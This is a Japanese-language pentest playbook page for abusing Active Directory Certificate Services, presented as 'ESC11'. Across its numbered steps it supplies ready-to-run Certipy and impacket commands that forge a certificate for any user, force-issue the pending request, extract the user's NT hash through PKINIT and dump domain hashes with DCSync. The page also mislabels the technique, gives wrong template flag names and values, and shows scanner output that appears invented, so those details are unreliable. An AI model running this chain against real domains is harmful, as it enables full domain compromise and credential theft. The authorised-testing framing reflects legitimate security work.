# ESC11 — IF_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME + PEND_ALL_REQUESTS 悪用

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（任意ユーザー名で発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。
> 演習環境では制約なし。

---

## 着火条件

以下のすべてが揃ったときに実施する：

- テンプレートの `msPKI-Enrollment-Flag` に `IF_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME`（`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME`、値 `0x00000002`）が設定されている
- 同時に `PEND_ALL_REQUESTS`（`CT_FLAG_PEND_ALL_REQUESTS`、値 `0x00000040`）が設定されている（→ `Requires Manager Approval: True`）
- 攻撃者が `ManageCertificates` 権限を CA 上で持っている（または ESC7 の権限昇格で付与可能）

**攻撃者の思考トレース：** `IF_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME` は申請者が SAN を自由に指定できるフラグ（ESC1 の核心条件）だが、`PEND_ALL_REQUESTS` が同時に設定されているとすべての申請が「保留（Pending）」になり、管理者承認なしには発行されない。しかし `ManageCertificates` 権限があれば Pending 状態の申請を手動で強制発行（Issue）できる。ESC7 で `ManageCertificates` を付与した後に本テンプレートを悪用するチェーンとしても有効。

> **注意（ESC11 の情報は限られる）：** `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME` を持ちながら `PEND_ALL_REQUESTS` も設定されているという組み合わせは管理ミスとして実環境で確認される例が少ない。Certipy の検出精度も `ManageCertificates` 権限の有無に依存する。

---

## 環境前提

- **実行環境**: テスター端末（ドメインユーザー権限・ネットワーク到達性があること）
- **必要なツール**: Certipy（`pip install certipy-ad --break-system-packages`。要インストール確認）
- **必要な権限**:
  - CA 上の `ManageCertificates` 権限（または ESC7 で付与）
  - テンプレートへの Enrollment 権限を持つドメインユーザー
- **オフライン代替**: Windows 端末上では `certutil -resubmit [REQUEST_ID]` で Pending 申請を承認可能（`ManageCertificates` 相当権限が必要）

---

## 観点・着眼点

### 先に確認すること

```bash
# [Attacker] 脆弱テンプレートを列挙
certipy find \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout
```

対象テンプレートの出力例：

```
Certificate Templates
  0
    Template Name                       : [TEMPLATE_NAME]
    Client Authentication               : True
    Enrollee Supplies Subject           : True            ← IF_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME
    Requires Manager Approval           : True            ← PEND_ALL_REQUESTS フラグ
    ...
    [!] Vulnerabilities
      ESC11                             : Requires 'ManageCertificates' to issue pending requests
```

CA の権限確認（`ManageCertificates` の有無）：

```
Certificate Authorities
  0
    Permissions
      Access Rights
        ManageCertificates              : [DOMAIN]\[GROUP_OR_USER]  ← ここに自分が含まれるか
```

### 何が出たら次に何をするか

| シグナル | 判断 |
|---------|------|
| `ESC11` が表示 かつ `ManageCertificates` に自分が含まれる | 直接手順 Step 1 へ |
| `ManageCertificates` を持っていない | ESC7 で `ManageCertificates` 権限を付与できるか確認 → `ESC7.md` |
| `Requires Manager Approval: True` だが `Enrollee Supplies Subject: False` | ESC11 には該当しない。ESC7（保留申請の強制発行）で別テンプレートを標的にする |
| `Requires Manager Approval: False` かつ `Enrollee Supplies Subject: True` | ESC1 として悪用できる → `ESC1.md` |

---

## 手順

事前準備（必須）：時刻同期（Kerberos は時刻ずれ ±5 分以内が必要）

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

### Step 1: 保留状態になることを前提に証明書を申請する

```bash
# [Attacker] SAN に標的 UPN を指定して申請（申請後 Pending になる）
certipy req \
  -ca [CA_NAME] \
  -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -upn [TARGET_UPN]
# → 出力に "Request ID is [REQUEST_ID]" と "Certificate request is pending" が表示される
```

出力例：

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is [REQUEST_ID]
[-] Got error while trying to get certificate: status code 202 (PENDING)
[*] Request is pending
```

### Step 2: ManageCertificates 権限で保留申請を強制発行する

```bash
# [Attacker] Pending 申請を強制発行（ManageCertificates 権限が必要）
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -issue-request [REQUEST_ID]
```

### Step 3: 発行済み証明書を取得する

```bash
# [Attacker] 発行済み証明書をダウンロード
certipy req \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -retrieve [REQUEST_ID]
# → [TARGET_USERNAME].pfx が生成される
```

### Step 4: 証明書で PKINIT 認証 → NT ハッシュ取得

```bash
# [Attacker] PKINIT 認証 → TGT + NT ハッシュ同時取得
certipy auth \
  -pfx [TARGET_USERNAME].pfx \
  -dc-ip [DC_IP]
```

### Step 5: NT ハッシュで DCSync（DA ハッシュを取得した場合）

```bash
# [Attacker] DCSync
impacket-secretsdump \
  -just-dc-ntlm \
  -no-pass \
  -hashes :[NT_HASH] \
  [DOMAIN]/[TARGET_USERNAME]@[DC_IP]
```

### 原状回復：証明書の失効

```bash
# [Attacker] 発行した証明書を失効
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -revoke [REQUEST_ID]
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `certipy ca -issue-request` が `ACCESS_DENIED` | `ManageCertificates` 権限がない。ESC7 で権限付与できるか確認する → `ESC7.md` |
| Step 1 で Pending にならず即時発行される | `PEND_ALL_REQUESTS` が実際には設定されていない。ESC1 として直接悪用できるか確認する |
| `certipy req -retrieve` が `Not Found` | REQUEST_ID が誤っているか、申請が管理者に削除されている |
| `certipy auth` が `KDC_ERR_PADATA_TYPE_NOSUPP` | DC が PKINIT 非サポート。または `StrongCertificateBindingEnforcement=2` で SID なし証明書を拒否 |

---

## 注意点・落とし穴

- **ESC7 との連携を意識する**：`ManageCertificates` が初期状態でない場合は ESC7 でまず権限を付与し、その後に ESC11 のフローに入る
- **`-issue-request` は CA への直接操作**：Certipy の CA 管理コマンドは RPC 経由で CA に問い合わせる。CA サーバーの IP は `-dc-ip` ではなく CA サーバー自身の IP が必要な場合がある（`certipy find` の `DNS Name` で確認）
- **REQUEST_ID の管理**：Step 1 の出力に表示される REQUEST_ID は Step 2・3 で必要なため、必ず記録する
- **ESC1 との違い**：ESC1 は `Requires Manager Approval: False` の即時発行テンプレートが対象。ESC11 は承認フラグがあるが `ManageCertificates` で回避する点が異なる

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。CA の管理操作（保留申請の強制発行）を伴うため、CA 管理者権限相当の操作になる
- **想定されるSIEM/EDR検知**: Event ID 4886（証明書要求）/ 4887（証明書発行）/ 4768（TGT 要求）/ CA 管理操作ログ / MDI アラート
- **業務影響リスク**: 証明書発行・CA 管理操作は業務影響は低いが、CA ログに全記録が残る
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効 / ✅ 取得した NT ハッシュ・TGT・pfx ファイルの暗号化保管・テスト完了時破棄
- **取得情報の取扱**: pfx ファイル・NT ハッシュ・TGT は暗号化保管、テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `./Overview.md`
- 前：ESC7（ManageCertificates 権限の悪用・付与） → `./ESC7.md`
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
